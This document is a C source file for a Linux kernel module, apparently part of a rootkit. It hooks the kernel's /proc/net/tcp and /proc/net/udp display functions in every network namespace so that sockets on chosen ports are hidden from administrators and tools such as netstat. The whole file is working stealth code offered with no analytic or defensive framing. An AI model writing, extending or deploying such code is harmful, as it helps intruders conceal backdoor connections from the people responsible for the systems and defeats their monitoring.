#include<linux/moduleparam.h>
#include<linux/module.h>
#include<linux/proc_fs.h>
#include<../fs/proc/internal.h> //proc_dir_entry
#include<linux/fs.h>
#include<linux/seq_file.h>
#include<linux/namei.h>
#include<linux/string.h>
#include<linux/types.h>
#include<net/tcp.h>
#include<net/udp.h>

#define MAX_PORTC 255
#define in_tcplist(x) port_in_list(x, tcp_ports, tcp_portc)
#define in_udplist(x) port_in_list(x, udp_ports, udp_portc)

static unsigned int tcp_ports[MAX_PORTC];
static unsigned int udp_ports[MAX_PORTC];
static int tcp_portc;
static int udp_portc;

void ** udp_hook_ptr, **tcp_hook_ptr;

module_param_array(tcp_ports, uint, &tcp_portc, 0);
MODULE_PARM_DESC(tcp_ports, "Array of TCP ports");
module_param_array(udp_ports, uint, &udp_portc, 0);
MODULE_PARM_DESC(udp_ports, "Array of UDP ports");

static int (*orig_tcp_seq_show)(struct seq_file*, void*);
static int (*orig_udp_seq_show)(struct seq_file*, void*);

static int port_in_list(unsigned int port, unsigned int list[], int count){
	int i;
	for(i = 0;i<count;i++){
		if(port == list[i]) return 1;
	}
	return 0;
} 

static int my_tcp_seq_show(struct seq_file * m, void * v){
	struct inet_sock * inet;
	struct sock * sp = v;
	struct tcp_iter_state *st;
	__u16 srcp, dstp;	

	if (v == SEQ_START_TOKEN){
		return orig_tcp_seq_show(m, v);
	}
	else{
		inet = inet_sk(sp);
		srcp = ntohs(inet->inet_sport);
		dstp = ntohs(inet->inet_dport);
		if(in_tcplist(srcp) || in_tcplist(dstp)){
			st = m->private;
			st->num -= 1;
			return 0;
		}
		return orig_tcp_seq_show(m,v);
	}				
			
	return orig_tcp_seq_show(m, v);
}

static int my_udp_seq_show(struct seq_file * m, void * v){
	struct inet_sock * inet;
	struct sock * sp = v;
	__u16 srcp, dstp;
	
	if (v == SEQ_START_TOKEN)
		return orig_udp_seq_show(m,v);
	else {
		inet = inet_sk(sp);
		srcp = ntohs(inet->inet_sport);
		dstp = ntohs(inet->inet_dport);
		
		if(in_udplist(srcp) || in_udplist(dstp)){
			return 0;
		}
		return orig_udp_seq_show(m,v);
	}				
			
	return 0;
}

struct proc_dir_entry* get_pde_subdir(struct proc_dir_entry* pde, const char* name){
	struct proc_dir_entry* result = pde->subdir;
 	while(result && strcmp(name, result->name)) {
    		result = result->next;
  	}
  	return result;
}



void hide_sockets(void){
	struct proc_dir_entry * net_dent, * tcp_dent, * udp_dent;
	struct net * net_ns;
	struct tcp_seq_afinfo * tcp_info;
	struct udp_seq_afinfo * udp_info;
	
	list_for_each_entry(net_ns, &net_namespace_list, list){
				
		net_dent = net_ns->proc_net;
		tcp_dent = get_pde_subdir(net_dent, "tcp");
		udp_dent = get_pde_subdir(net_dent, "udp");
		tcp_info = tcp_dent->data;
		udp_info = udp_dent->data;

		// Save and hook the TCP show function
		tcp_hook_ptr = (void**) &tcp_info->seq_ops.show;
		orig_tcp_seq_show = *tcp_hook_ptr;
		*tcp_hook_ptr = my_tcp_seq_show;

		// Save and hook the UDP show function
		udp_hook_ptr = (void**) &udp_info->seq_ops.show;
		orig_udp_seq_show = *udp_hook_ptr;
		*udp_hook_ptr = my_udp_seq_show;
  	}
}

void unhide_sockets(void){
	*udp_hook_ptr = orig_udp_seq_show;
	*tcp_hook_ptr = orig_tcp_seq_show;
}
